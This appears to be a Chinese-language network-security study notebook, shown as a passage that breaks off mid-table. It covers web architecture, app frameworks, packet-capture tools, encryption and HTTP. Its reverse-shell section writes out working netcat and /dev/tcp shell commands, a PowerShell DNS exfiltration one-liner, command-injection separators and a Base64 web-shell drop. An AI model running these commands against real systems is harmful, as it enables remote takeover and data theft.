[{"id":"b08904c0bab28ee83d3b8e8bd866184d","title":"网安知识点笔记（持续更新中）","content":"网安知识点基础入门一、Web应用Web四大件1.系统\nLinux、windows、macos\n\n2.中间件\n我们经常管web中间件叫做web服务器或者web容器，中间件（英语：Middleware）是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。中间件处在操作系统和更高一级应用程序之间。他充当的功能是：将应用程序运行环境与操作系统隔离，从而实现应用程序开发者不必为更多系统问题忧虑，而直接关注该应用程序在解决问题上的能力 。容器就是中间件的一种。\n也就是说，关于中间件，我们可以理解为：是一类能够为一种或多种应用程序合作互通、资源共享，同时还能够为该应用程序提供相关的服务的软件。（注意：中间件是一类软件的总称，不是单独的一个软件）\n常见的web中间件有: Apache Websphere IIS tomcat JBoss Weblogic IBM HTTP Server NGINX\n核心功能包括：\n1.HTTP协议处理：解析请求并生成响应（如Apache、Nginx的HTTP引擎）\n2.静态资源服务：直接返回HTML、CSS、图片等文件\n3.动态内容支持：通过PHP、Node.js等语言生成个性化数据\n4.安全控制：SSL&#x2F;TLS加密、访问权限管理\n\n\n\n 中间件配置对后续部署的影响\n中间件（如 Nginx、Tomcat、Redis）的配置直接影响系统的性能、稳定性和可维护性，具体如下：\n\n负载均衡：Nginx 可配置反向代理，将请求分发到多个后端服务器，避免单节点过载，提升系统可用性。\n缓存策略：Redis 作为缓存中间件，合理配置缓存过期时间和淘汰策略，可减少数据库访问压力，加快响应速度。\n安全防护：中间件可配置 SSL 证书（HTTPS）、请求过滤（防 SQL 注入、XSS），增强系统安全性。\n日志与监控：中间件的日志配置（如访问日志、错误日志）便于后续故障排查，监控配置（如 CPU &#x2F; 内存占用）可提前发现性能瓶颈\n\n3.数据库\n常见的有：mysql，mssql，access\n\n本地存储：\n\n源码和数据库放在一起\n\n站库分离：\n\n将网站应用程序（前端 + 后端）与数据库服务器分离部署在不同服务器上，优势包括：\n\n提升性能：应用和数据库服务器资源独立分配，避免相互抢占资源（如 CPU、内存）。\n\n增强安全性：数据库服务器可单独配置防火墙和访问策略，减少直接暴露风险。\n\n便于扩展：应用和数据库可各自根据流量需求扩容，例如数据库可通过主从复制提升读性能。\n\n\n云数据库：\n\n安全组和登陆方式配置可以更加复杂。甚至有 oos 对象存储服务，专门用来放置图片和视频，更加安全\n\n4.源码实现网站功能的代码集合，包括：\n\n1.前端技术：HTML&#x2F;CSS&#x2F;JavaScript构建用户界面，框架如Vue、React\n2.后端逻辑：PHP、Python、Java等处理业务\n3.架构模式：\n单体应用：传统模式，代码集中\n微服务：模块式拆分，适合复杂系统\n\n\n\n源码类型：\n\n开源、商业、自研\n\nWeb架构1.常规化\n原理：源码数据都在同服务器\n影响：无，常规安全测试手法\n\n2.站库分离\n原理：源码数据库不在同服务器\n存储：其他服务器上数据库&amp;云数据库产品\n影响：数据被单独存放，能连接才可影响数据\n\n3.前后端分离\n原理：前端JS框架，API传输数据\n影响：\n1.前端页面大部分不存在漏洞\n2.后端管理大部分不在同域名\n3.获得权限有可能不影响后端\n\n\n\n4.宝塔+phpstudy\n原理：打包类集成环境，权限配置或受配置\n影响：攻击者权限对比区别\n区别：宝塔更安全一点\n\n5.Docker容器\n原理：虚拟化技术独立磁盘空间\n影响：攻击者虚拟空间磁盘\n\n6.建站分配站\n1.托管2.申请\n原理：利用别人域名模版建立\n影响：实质安全测试非目标资产\n\n7.静态Web\n例子：大学学的html设计网站\n原理：数据没有传输性（js传输不算）\n影响：无漏洞\n\n8.WAF\n原理：Web应用防火墙，旨在提供保护\n影响：常规Web安全测试手段会受到拦截\n演示：免费D盾防护软件\nWindows2012 + IIS +D盾\n\n\n9.CDN\n原理：内容分发服务，旨在提高访问速度\n影响：隐藏真实源IP，导致对目标测试错误\n演示：阿里云备案域名全局CDN加速服务\nWindows2012 + BT宝塔面板 + CDN服务\n\n\n10.OSS\n原理：云存储服务，旨在提高访问速度\n\n演示：https://cloudreve.org/\nWindows2012 + cloudreve + 阿里云OSS\nhttps://github.com/cloudreve/Cloudreve/releases/tag/3.7.1\n1、启动应用\n2、登录管理\n3、配置存储信息\n4、更改用户组存储属性\n\n阿里云OSS:\n1、开通OSS\n2、新建Bucket\n3、配置Bucket属性\n4、配置Access访问\n\n\n为什么要使用第三方存储？\n\n静态文件会占用大量带宽\n加载速度\n存储空间\n\n影响：\n\n上传的文件或解析的文件均来自于OSS资源，无法解析，单独存储\n\n1、修复上传安全\n\n2、文件解析不一样\n\n3、但Accesskey隐患\n\n\n\n\n\n11.反向代理\n正向代理为客户端服务,客户端主动建立代理访问目标（不代理不可达）\n反向代理为服务端服务,服务端主动转发数据给可访问地址（不主动不可达）\n\n原理：通过网络反向代理转发真实服务达到访问目的\n\n影响：访问目标只是个代理，并非真实应用服务器\n\n注意：正向代理和反向代理都是解决访问不可达的问题，但由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实应用毫无关系！\n\n补充：正向代理就相当于一个服务器你无法访问自己找了个代理服务器去访问        反向代理就是你本来无法访问那个服务器，所以服务器那边整了个搭理服务器让你访问\n\n\n12.负载均衡\n原理：分摊到多个操作单元上进行执行，共同完成工作任务\n影响：有多个服务器加载服务，测试过程中存在多个目标情况\n\n二、App应用应用开发架构1.原生开发原生APP开发是指针对特定平台(iOS&#x2F;Android)使用官方语言和工具进行开发的方式。\n安卓一般使用java语言开发，当然现在也有kotlin语言进行开发。如何开发就涉及到具体编程了，这里就不详说了。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。\n原生开发有以下特点：\n（1）平台特性\n\niOS使用Swift&#x2F;Objective-C + Xcode开发，遵循Apple设计规范\nAndroid使用Java&#x2F;Kotlin + Android Studio开发，遵循Material Design\n\n（2）安全优势\n\n性能优化好，可直接调用系统安全API\n可实施更严格的安全措施如代码混淆、完整性校验\n支持双向TLS(mTLS)等高级安全协议\n\n（3）安全风险\n\n需防范逆向工程(反编译、动态调试)\nAPI接口暴露风险\n平台差异导致的安全策略不一致\n\n（4）网安测试要点\n\n接口安全测试(抓包分析)\n本地数据存储安全\n组件权限配置检查\n\n（5）安全影响\n\n反编译&amp;抓包&amp;常规测试\n逆向的角度去分析逻辑设计安全\n\n2.H5语言开发H5(HTML5)是HTML的第五代标准，作为现代Web开发的核心技术，它已成为构建跨平台应用的重要工具。\n使用H5开发的好处有很多，可多端复用，比如浏览器端，ios端，当然H5开发的体验是没有原生好的。一般来说如果这个页面需要分享出去的话，就用H5开发。\nH5开发具有以下特点：\n（1）H5技术基础\n\n核心组件：HTML5(结构)+CSS3(样式)+JavaScript(逻辑)，三者协同工作\n关键API：Canvas绘图、WebGL(3D渲染)、Web Audio(音频处理)、Geolocation(定位)等\n存储机制：支持localStorage&#x2F;sessionStorage本地存储，比Cookie更安全但需防范XSS攻击\n\n（2）安全特性\n\n沙箱机制：默认运行在浏览器安全沙箱中，限制系统资源访问\nCORS策略：通过跨域资源共享策略控制外部资源访问\nHTTPS支持：强制要求混合内容中的敏感资源使用安全传输\n\n（3）安全风险\n\nXSS漏洞：动态内容注入风险高于原生应用\n数据泄露：本地存储数据可能被恶意读取\n中间人攻击：网络阐述层需额外加密保护\n\n3.使用flutter开发Flutter是Google推出的跨平台应用开发框架，使用Dart语言编写，能够构建iOS、Android、Web及桌面端应用。但由于是近几年退出的的，技术比较新，生态还不完善，开发效率偏低\nFlutter开发具有以下特点：\n（1）核心特性\n\n跨平台支持：一套代码可编译为iOS、Android、Web、Windows、macOS和Linux应用\n高性能渲染：使用Skia引擎直接渲染，绕过平台原生组件，性能接近原生应用\n热重载功能：修改代码后无需重启应用即可看到效果，大幅提升开发效率\n\n（2）安全优势\n\n代码混淆支持：可对Dart代码进行混淆，增加逆向工程难度\n安全存储机制：提供flutter_secure_storage等插件安全存储敏感数据\nHTTPS强制支持：网络请求默认强制使用HTTPS加密传输\n\n（3）安全风险\n\nDart代码反编译：相比原生代码更易被反编译分析\n插件安全依赖：第三方插件可能引入安全漏洞\n跨平台一致性风险：不同平台可能实现安全机制不一致\n\n（4）网安测试要点\n\n接口安全测试：检查API接口的认证、授权和数据加密\n本地存储检查：验证敏感数据是否加密存储\n权限管理审计：检查应用是否遵循最小权限原则\n代码混淆验证：确认发布版本是否经过充分混淆\n\n4.常规Web开发Web开发是构建在互联网上运行的网站和应用程序的过程，主要分为前端和后端两大技术方向。\nWeb App软件开发简单地说，就是开发一个网站，然后加入app的壳。Web App一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且app内的交互设计等非常有效。但开发周期长端，需要的技术人员少，成本低。\nWeb开发具有以下特点：\n（1）核心技术栈\n\n前端技术：\t\nHTML：定义网页结构和内容\nCSS：控制网页样式和布局\nJavaScript：实现交互功能和动态效果\n前端框架：React、Vue、Angular等提高开发效率\n\n\n后端技术：\n服务器语言：PHP、Java、Python、Node.js等\n数据库：MySQL、PostgreSQL、MongoDB等\nWeb服务器：Apache、Nginx等\n\n\n\n（2）安全特性\n\n浏览器安全机制：\n同源策略限制跨域访问\nCSP(内容安全策略)可缓解XSS攻击\nHTTPS加密传输保障数据安全\n\n\n认证与授权：\n支持多种认证方式(OAuth、JWT等)\n可实施细粒度访问控制\n\n\n\n（3）安全风险\n\n常见漏洞：\nXSS(跨站脚本攻击)\nSQL注入\nCSRF(跨站请求伪造)\n文件上传漏洞\n\n\n数据安全风险：\n敏感信息泄露\n会话劫持\nAPI接口滥用\n\n\n\n（4）网安测试要点\n\n渗透测试：\n检查输入验证和输出编码\n测试认证和会话管理机制\n验证敏感数据保护措施\n\n\n代码审计\n检查安全编码实践\n识别硬编码凭证\n评估第三方库风险\n\n\n\n三、反弹shell1.文件上传下载作用：解决无图形化&amp;解决数据传输\n使用：在ip地址搭建web在目录上放我们的工具，访问即可下载，我们利用网站生成传输文件命令，通过命令执行漏洞让目标下载上我们的工具，然后可以进行我们下一步的操作\n![](.&#x2F;网安知识点.assets&#x2F;屏幕截图 2025-06-15 232304.png)\n![](.&#x2F;网安知识点.assets&#x2F;屏幕截图 2025-06-15 233009.png)\n2.反弹shell命令（1）&#x3D;&#x3D;定义&#x3D;&#x3D;\n\n反弹Shell是一种网络攻击技术，被控端（受害者）主动连接控制端（攻击者），并将命令行输入输出重定向到控制端，实现远程控制。与传统的SSH、Telnet等正向连接相反，反弹Shell通过角色反转绕过防火墙等限制\n\n（2）&#x3D;&#x3D;基本原理&#x3D;&#x3D;\n\n控制端：监听指定TCP&#x2F;UDP端口（如nc -lvp 4444）。\n被控端：执行命令将Shell会话重定向到控制端（如bash -i &amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1），通过Socket通信传输数据\n\n（3）&#x3D;&#x3D;正向连接&#x3D;&#x3D;\n\n定义：正向连接指控制端（攻击者）主动发起连接至被控端（目标机器），要求目标机器开放指定端口并允许入站连接\n原理：\n被控端启动监听服务（如nc -lvvp 5566 -e /bin/bash）。\n控制端主动连接目标IP和端口（如nc 目标IP 5566），建立Shell会话\n\n\nLinux 控制 Windows\n\n1234//绑定 CMD 到本地 5566 端口nc -e cmd -lvp 5566//主动连接目标 5566ncat 47.122.23.131 5566\n\n\nWindows 控制 Linux\n\n1234//绑定 SH 到本地 5566 端口ncat -e /bin/sh -lvp 5566//主动连接目标 5566nc 47.94.236.117 5566\n\n\n特点：\n控制端主动连接目标\n类似SSH&#x2F;Telnet等传统服务\n适用于内网无防护环境\n\n\n限制：\n目标需有固定公网IP或端口映射\n防火墙&#x2F;NAT可能阻止入站连接\n动态IP目标难以持续控制\n\n\n典型场景：\n内网渗透：攻击已进入内网，直接连接未防护的目标机器\n服务暴露：目标机器主动开放端口提供远程管理（如数据库服务）\n\n\n\n（4）&#x3D;&#x3D;反向连接&#x3D;&#x3D;\n\n定义：\n反向连接指被控端主动连接控制端，由攻击者预先监听端口，目标机器发起请求建立Shell会话\n\n\n原理：\n控制端监听端口（如nc -lvp 4444）。\n被控端执行命令反向连接（如bash -i &gt;&amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1）\n\n\nWindows 控制 Linux\n\n1234//绑定 CMD 到目标 5566 端口ncat -e /bin/sh 47.122.23.131 5566  //靶机//等待 5566 连接nc -lvvp 5566\n\n\nLinux 控制 Windows\n\n1234//绑定 CMD 到目标 5566 端口nc -e cmd 47.94.236.117 5566   //靶机//等待 5566 连接ncat -lvvp 5566\n\n\n特点：\n被控端主动出站\n控制端无需暴露IP\n适应动态IP环境\n\n\n优势：\n绕过防火墙&#x2F;NAT限制\n隐蔽性强，避免IDS检测\n适合外网渗透和持久控制\n\n\n典型场景：\n防火墙绕过：目标仅允许出站流量（如企业内网）\n动态IP控制：目标IP频繁变化（如家庭宽带）\n恶意软件分发：木马主动连接C2服务器\n\n\n\n（5）&#x3D;&#x3D;正反向连接对比&#x3D;&#x3D;\n\n\n\n对比维度\n正向连接\n反向连接\n\n\n\n连接方向\n控制端→被控端\n被控端→控制端\n\n\n防火墙穿透\n依赖入站规则\n利用出站规则\n\n\n适用环境\n内网无防护\n外网&#x2F;动态IP\n\n\n隐蔽性\n易被检测\n隐蔽性高\n\n\n工具依赖\n需目标开放端口\n需控制端监听端口\n\n\n（6）&#x3D;&#x3D;命令执行&#x3D;&#x3D;\n\n通过管道符，进行额外的命令执行\nwindows： |  &amp;  ||  &amp;&amp;\nLinux： ;  |  ||  &amp;  &amp;&amp;  （特有&#96;&#96;和;）\n例子：\nping -c 1 127.0.0.1 ; whoami\n\n\n\n（7）&#x3D;&#x3D;数据不回显&#x3D;&#x3D;\n\n通常我们执行命令，要先看目标是什么系统，但如果没有回显，就不能用ping -c 1 127.0.0.1 ; whoami\n如果是Linux的话，我们可以 ping 反引号+whoami+反引号.dns网址，就可以在那个网址上看到执行完whoami的ip\n但windows不行，windows并没有&#96;&#96;所以我们需要，用别的方法来进行操作，比如\n\n12127.0.0.1 | powershell $x=whoami;$x=$x.Replace(&#x27;\\&#x27;,&#x27;xxx&#x27;);$y=&#x27;.dns网址&#x27;;$z=$x+$y;ping $z//我们可以通过powershell将我们想要输出的内容，通过变量进行输出，这样也可以得到我们想要的信息\n\n\n\n\n\n四、抓包工具Fiddler\n核心定位：HTTP&#x2F;HTTPS调试代理，专注Web应用层安全分析\n\n协议支持：HTTP&#x2F;HTTPS（可解密SSL&#x2F;TLS）、WebSocket。\n\n网络安全应用场景：\n\n漏洞挖掘：拦截修改请求&#x2F;响应，测试XSS、CSRF、参数篡改等漏洞\n会话劫持：捕获Cookie&#x2F;Session ID，重放会话验证身份验证缺陷\nHTTPS解密：通过中间人攻击（MITM）解密HTTPS流量，分析加密内容\n\n\n使用技巧：\n\n断点调试：Rules &gt; Automatic Breakpoints 拦截请求修改参数（如注入Payload）\nAutoResponder：模拟恶意响应（如替换JS文件植入后门）\n移动端抓包：配置手机代理至PC IP+端口（默认8888），安装Fiddler根证书解密HTTPS\n\n\n\nCharles\n核心定位：HTTP&#x2F;HTTPS代理，侧重API调试与可视化分析\n协议支持：HTTP&#x2F;HTTPS、FTP、SMTP。\n网络安全应用场景：\nAPI安全测试：树状结构展示请求层级，分析接口参数敏感数据泄露\n重放攻击测试：修改历史请求重复发送，验证服务端幂等性漏洞\n弱网模拟：Proxy &gt; Throttle Settings 测试超时处理、重放攻击成功率\n\n\n使用技巧：\nMap功能：重定向请求至恶意服务器（Tools &gt; Map Remote）\nSSL代理：Proxy &gt; SSL Proxying Settings 添加*:443全局解密HTTPS\n移动端配置：类似Fiddler，需安装Charles证书（Help &gt; SSL Proxying）\n\n\n\nTcpDump\n核心定位：命令行网络嗅探器，适用于服务器层流量捕获\n协议支持：全协议（TCP&#x2F;IP栈），包括ARP、ICMP、DNS等。\n网络安全应用场景：\n网络层攻击检测：抓取SYN洪水攻击（tcpdump &#39;tcp[tcpflags] &amp; tcp-syn != 0&#39;）\n异常流量分析：识别异常ARP请求（ARP欺骗）、异常ICMP（隧道攻击）\n数据泄露监控：捕获含敏感关键词的明文传输（如tcpdump -A port 80 | grep &quot;password&quot;）\n\n\n\n&#x3D;&#x3D;BurpSuite&#x3D;&#x3D;\n核心定位：集成化Web应用渗透测试平台\n协议支持：HTTP&#x2F;HTTPS、WebSocket。\n网络安全应用场景：\n自动化漏洞扫描：Scanner模块检测SQL注入、XSS等OWASP Top 10漏洞\n暴力破解：Intruder模块自动化密码爆破（如撞库攻击测试）\n逻辑漏洞挖掘：Repeater修改请求顺序，测试越权、支付漏洞\n\n\n使用技巧：\n证书配置：浏览器安装Burp CA证书（http://burp/cert）解密HTTPS\n爬虫与扫描：Spider映射站点结构，Scanner自动扫描入口点\n插件扩展：集成Logger++记录历史流量，Autorize测试垂直越权\n\n\n\nWireshark\n核心定位：全协议深度解析的网络协议分析器\n协议支持：超700种协议（TCP&#x2F;IP、DNS、DHCP、SSH等）。\n网络安全应用场景：\n协议漏洞分析：解析异常协议字段（如畸形DNS响应引发缓存中毒）\n网络取证：重组TCP流追踪攻击路径（Follow TCP Stream）\n恶意软件通信：检测C2服务器连接（如识别DNS隧道、非标准端口加密流量）\n\n\n使用技巧：\n显示过滤器：http.request过滤HTTP请求，tls.handshake聚焦TLS协商\n着色规则：标记异常流量（如TCP重传标红）\n统计功能：Statistics &gt; Endpoints定位高流量异常主机\n\n\n\n科来网络分析系统\n核心定位：国产企业级流量分析工具，侧重网络诊断与安全审计\n协议支持：主流协议全覆盖，支持自定义协议解码。\n网络安全应用场景：\n内网威胁狩猎：矩阵视图可视化主机连接，定位横向移动或矿机通信\n木马检测：分析异常DNS请求（如频繁解析动态域名）\n数据泄露监控：日志视图追踪HTTP文件传输、SMTP邮件外发\n\n\n使用技巧：\n诊断视图：自动标记TCP重传、ARP欺骗等异常事件\n回溯分析：保存流量回放复现攻击链（文件 &gt; 保存抓包文件）\n自定义协议：解码私有协议或恶意软件通信格式\n\n\n\n各个抓包工具的差异\n\n\n工具\n最佳场景\n协议侧重\n安全测试优势\n\n\n\nFiddler\nWeb调试&#x2F;移动端HTTPS分析\nHTTP&#x2F;HTTPS\n请求篡改、会话劫持\n\n\nCharles\nAPI安全&#x2F;弱网测试\nHTTP&#x2F;HTTPS\n流量重定向、重放攻击\n\n\nTcpdump\n服务器层流量捕获\n全协议\n实时攻击检测、命令行高效操作\n\n\nBurp Suite\nWeb渗透测试\nHTTP&#x2F;HTTPS\n自动化漏洞扫描、暴力破解\n\n\nWireshark\n全协议深度解析\n700+协议\n协议漏洞分析、网络取证\n\n\n科来\n内网威胁狩猎&#x2F;网络诊断\n主流协议+自定义\n可视化追踪、自动异常诊断\n\n\n五、算法加密1.算法加密的应用对象和安全价值（1）数据传输保护\n\nHTTPS&#x2F;TLS：采用混合加密（RSA交换密钥 + AES加密数据），防中间人窃听。TLS 1.3已禁用弱算法（如RC4、SHA-1），优先支持AES-GCM和ChaCha20-Poly1305。\n端到端加密：消息应用（如Signal）使用双棘轮协议，每次会话更新密钥，防历史消息解密\n\n（2）敏感数据存储\n\n数据库字段加密：信用卡号、身份证号等采用AES-256加密，密钥由HSM（硬件安全模块）管理\n全盘加密：BitLocker（Windows）、FileVault（Mac）使用XTS-AES模式，防物理窃取\n\n（3）身份验证与签名\n\n数字证书：RSA&#x2F;ECC非对称加密实现身份绑定，CA私钥泄露将导致信任链崩塌（如沃通事件）\n区块链交易：ECDSA签名验证资产所有权，私钥丢失即永久丧失资产控制权\n\n2.数据传输（1）传输数据-编码型&amp;加密型\n\n某视频\n某 Web站\n博客登录\nApp 斗地主\n影响：漏洞探针\n\n（2）传输格式-常规&amp;JSON&amp;XML\n\nApp 期H\nApp 斗地主\n影响：发送漏洞探针，回显数据分析\n\n（3）密码存储-Web&amp;系统&amp;三方应用\n\nZZZCMS&amp;Dz\nWin&amp;Linux\nMSSQL&amp;MYSQL\n影响：安全后渗透测试\n\n（4）代码混淆-源代码加密&amp;逆向保护\n\nPHP&amp;Js 混淆加密\nEXE&amp;JAR 代码保护\n影响：代码审计，逆向破解\n\n&#x3D;&#x3D;为什么要了解数据在传输的时候进行编码？&#x3D;&#x3D;\n\n对方服务器可能会在接受的时候进行解码在带入\n\n如果我们还是按照原有思路不对自己的Payload进行同样编码的话 传入过去的东西就是不认识的东西 测试无效\n\n正确方式：测试的话也要进行payload同样的加密或编码进行提交\n安全测试漏洞时候 通常都会进行数据的修改增加提交测试\n以数据的正确格式发送 接受才行\n\n\n3.常见加密算法&#x3D;&#x3D;3.1.单向散列加密&#x3D;&#x3D;（1）核心原理与识别方式\n\n原理：将任意长度输入（消息）通过哈希函数（如SHA-256）转换为固定长度的输出（散列值），具有单向性（不可逆）和抗碰撞性（不同输入产生相同输出的概率极低）\n优点：方便存储，损耗低：加密&#x2F;加密对于性能的损耗微乎其微。\n缺点：单向散列加密的缺点就是存在暴力破解的可能性，最好通过加掩码值的方式提高安全性，此外可能存在散列冲突。我们都知道MD5加密也是可以破解的。\nmd5的三个特征：\n确定性：一个原始数据的MD5值是唯一的，同一个原始数据不可能会计算出多个不同的MD5值。\n碰撞性：原始数据与其MD5值并不是一一对应的，有可能多个原始数据计算出来的MD5值是一样的，这就是碰撞。\n不可逆：也就是说如果告诉你一个MD5值，你是无法通过它还原出它的原始数据的，这不是你的技术不够牛，这是由它的算法所决定的。因为根据第4点，一个给定的MD5值是可能对应多个原始数据的，并且理论上讲是可以对应无限多个原始数据，所有无法确定到底是由哪个原始数据产生的。\n\n\n\n（2）核心算法\n\n安全算法：SHA-256、SHA-3（抗量子计算）\n风险算法：MD5、SHA-1（已被攻破，易碰撞攻击）\n\n（3）当今社会应用场景\n\n密码存储：用户密码存储为散列值（如bcrypt加盐哈希），即使数据库泄露也无法还原明文\n文件完整性校验：软件下载站提供文件的SHA-256散列值，用户验证文件是否被篡改（如Tomcat官网）\n数字签名基础：对消息摘要签名（如HMAC算法），确保数据来源可信（API接口验签）\n云盘秒传：通过文件哈希值匹配云端已有文件，避免重复上传（如百度网盘）\n\n&#x3D;&#x3D;3.2.对称加密&#x3D;&#x3D;（1）核心原理与识别方式\n\n原理：加密和解密使用同一密钥（如AES-256），算法高效但密钥需安全分发\n优点：对称加密优点是算法公开、计算量小、加密速度快、加密效率高\n缺点：发送方和接收方必须商定好密钥，然后使双方都能保存好密钥，密钥管理成为双方的负担。\n识别特征：\n加&#x2F;解密速度快，适合大数据量；\n密钥管理复杂（需安全通道传输密钥）；\n常见算法标识：AES、DES（已淘汰）、3DES。\n\n\n\n（2）核心算法\n\nAES（Advanced Encryption Standard）：支持128&#x2F;192&#x2F;256位密钥，GCM模式提供认证加密\n3DES：三重DES增强安全性，但因性能差被AES取代\n\n（3）当今社会应用场景\n\n数据传输加密：\nHTTPS通信中的会话加密（TLS握手后使用AES加密数据流）\nWi-Fi安全协议（WPA3使用AES-256）\n\n\n静态数据保护：\n数据库字段加密（如信用卡号用AES加密存储）\n全盘加密工具（如BitLocker、FileVault）\n\n\n实时通信加密：\n视频会议系统（如Zoom）使用AES加密音视频流\n\n\n\n\n&#x3D;&#x3D;3.3.非对称加密&#x3D;&#x3D;（1）核心原理与识别方式\n\n原理：使用密钥对（公钥加密、私钥解密），公钥可公开，私钥保密\n优点：非对称加密的优点是与对称加密相比，安全性更好，加解密需要不同的密钥，公钥和私钥都可进行相互的加解密。\n缺点：缺点是加密和解密花费时间长、速度慢，只适合对少量数据进行加密。\n识别特征：\n加&#x2F;解密速度慢，适合小数据量（如密钥交换）；\n支持数字签名（私钥签名，公钥验证）；\n常见算法标识：RSA、ECC（椭圆曲线）。\n\n\n\n（2）核心算法\n\nRSA：基于大整数分解难题（密钥≥2048位）\nECC：相同安全强度下密钥更短（256位≈RSA 3072位），适合移动设备\n\n（3）当今社会应用场景\n\n安全通信基石：\nTLS&#x2F;SSL握手：通过RSA&#x2F;ECC交换对称会话密钥（如浏览器HTTPS连接）\n端到端加密：消息应用（如Signal）使用ECDH协议动态生成密钥\n\n\n数字身份认证：\n数字证书（CA用私钥签名，公钥验证网站身份）\n区块链交易签名（比特币用ECDSA验证所有权）\n\n\n数据防篡改：\n文档&#x2F;软件签名（如Adobe PDF签名、安卓APK签名）\n\n\n\n\n\n&#x3D;&#x3D;3.4.Base系列加密&#x3D;&#x3D;1.Base64\n\n原理：\n\n将 3字节（24位） 二进制数据按 6位一组 划分为4组，每组映射到64字符集（A-Za-z0-9+/），末尾用 = 填充至4的倍数。\n示例： &quot;ABC&quot; → 二进制 01000001 01000010 01000011 → 6位分组 010000 010100 001001 000011 → 映射为 &quot;QUJD&quot;。\n\n\n识别特征：\n\n密文含 A-Za-z0-9+/=，长度必为4的倍数（如 SGVsbG8=）；\n无小写字母 o、数字 0、大写 I 等易混淆字符。\n\n\n攻防应用：\n\n攻击利用：隐藏Web Shell（echo PD9waHA... | base64 -d &gt; shell.php）\nWAF绕过：多重编码（Base64 → URL编码 → Hex）干扰正则检测\n防御场景：邮件附件、HTTPS证书、图片内嵌（Data URL）。\n\n\n安全风险：非加密算法，可直接解码 暴露数据，需搭配AES等加密使用\n\n\n2.Base32\n\n原理：将 5字节（40位） 数据按 5位一组 划分为8组，映射到32字符集（A-Z2-7），用 = 填充至8的倍数。\n识别特征：\n全大写字母+数字 2-7（如 JBSWY3DP），无 1/8/9/0 等字符；\n长度通常为8的倍数。\n\n\n攻防应用：\n隐蔽通信：恶意软件命令传输（如DNS隧道中隐藏C2指令）；\n兼容性优势：比Base64更易人工识别（无大小写混淆）\n\n\n\n&#x3D;&#x3D;3.5.加密算法的对比与选型&#x3D;&#x3D;\n\n\n技术类型\n代表算法\n密钥管理\n速度\n安全性依赖\n典型应用场景\n攻击风险\n\n\n\n单向散列加密\nSHA-256, bcrypt\n无密钥\n极快（纳秒级）\n抗碰撞性\n密码存储、文件校验\n彩虹表攻击（未加盐）\n\n\n对称加密\nAES-256-GCM\n单一密钥，需安全分发\n快（GB&#x2F;s级）\n密钥保密性\n数据库加密、实时通信\n侧信道攻击、弱密钥爆破\n\n\n非对称加密\nECC-256, RSA-2048\n密钥对（公钥&#x2F;私钥）\n慢（KB&#x2F;s级）\n私钥保密性\n密钥交换、数字签名\n量子计算威胁（RSA）\n\n\nBase64编码\n无\n无密钥\n快\n非加密！\nHTTP数据传输、邮件附件\n裸数据暴露、WAF绕过\n\n\n4.加密算法的特点4.1.MD5\n由数字“0-9”和字母“a-f”所组成的字符串\n固定的位数 16 和 32位\n&#x3D;&#x3D;解密需求&#x3D;&#x3D;：密文即可，但复杂的明文可能解不出\n\n4.2.Base64\n大小写区分，通过数字和字母的组合\n一般情况下密文尾部都会有两个等号，明文很少的时候则没有\n明文越长密文越长，一般不会出现”&#x2F;“”+”在密文中\n\n4.3.AES、DES\n同BASE64基本类似，但一般会出现”&#x2F;“和”+”在密文中\n&#x3D;&#x3D;解密需求&#x3D;&#x3D;：密文，模式，加密Key，偏移量，条件满足才可解出\n\n4.4.RSA\n特征同AES,DES相似，但是长度较长\n&#x3D;&#x3D;解密需求&#x3D;&#x3D;：密文，公钥或私钥即可解出\n\n六、HTTP 数据包一、HTPP数据包基础1. 定义与定位\n本质：HTTP数据包是客户端（如浏览器）与服务器之间传输数据的格式化信息单元，分为请求报文（Request）和响应报文（Response）\n\n协议层级：位于OSI模型的应用层，依赖传输层TCP协议（默认端口80）建立可靠连接\n\n\n2. 通信模型\n请求-响应模式：\n\n客户端发送请求 → 服务器返回响应 → 连接关闭（HTTP&#x2F;1.0）或复用连接（HTTP&#x2F;1.1+）\n\n\n无状态性：每个请求独立，需依赖Cookie&#x2F;Session等机制维持会话状态\n\n\n二、请求报文结构解析1. 请求行**（Request Line）**1GET /api/data?page=1 HTTP/1.1\n\n\n请求方法：定义操作类型（共8种，详见下文）\n\n请求路径：资源位置（如/api/data），可含查询参数（?page=1）。\n\n协议版本：HTTP/1.1（主流）或HTTP/2（二进制分帧）\n\n\n2.请求头**（Request Headers）**键值对形式，描述客户端环境及请求属性：\n\n\n\n常用请求头\n功能说明\n\n\n\nHost: example.com\n目标域名（HTTP&#x2F;1.1强制要求）\n\n\nUser-Agent: ...\n客户端标识（浏览器&#x2F;操作系统信息）\n\n\nAccept: text/html\n可接收的响应类型（MIME类型）\n\n\nCookie: id=abc123\n携带会话凭证\n\n\nAuthorization: Bearer ...\n身份认证令牌\n\n\n3.请求体**（Request Body）**\n适用场景：POST、PUT、PATCH方法提交数据（如JSON、表单）\n长度标识：Content-Length或Transfer-Encoding: chunked（分块传输）\n\n三、响应报文结构解析1.状态行**（Status Line）**1HTTP/1.1 200 OK\n\n\n协议版本：同请求报文。\n状态码：3位数字，标识处理结果（分类见下表）\n状态文本：描述性短语（如OK）。\n\n2.状态码分类\n\n\n状态码\n分类\n名称\n定义与触发场景\n典型响应头\n幂等性\n\n\n\n100\n1xx (信息响应)\nContinue\n服务器已接收请求头，要求客户端继续发送请求体（用于大文件上传前的确认）\nExpect: 100-continue\n-\n\n\n101\n\nSwitching Protocols\n服务器同意协议切换（如HTTP升级至WebSocket）\nUpgrade: websocket\n-\n\n\n102\n\nProcessing\n服务器已接收请求但处理未完成（WebDAV异步操作）\n-\n-\n\n\n200\n2xx (成功)\nOK\n请求成功，响应体包含资源（GET）或操作结果（POST）\nContent-Type\n是\n\n\n201\n\nCreated\n资源创建成功（常见于POST&#x2F;PUT请求）\nLocation: /new-resource\n否\n\n\n204\n\nNo Content\n请求成功但无返回内容（常见于DELETE请求）\n-\n是\n\n\n206\n\nPartial Content\n部分内容响应（支持分块下载或断点续传）\nContent-Range: bytes 0-499/2000\n是\n\n\n301\n3xx (重定向)\nMoved Permanently\n资源永久迁移，客户端应更新书签（SEO权重转移）\nLocation: 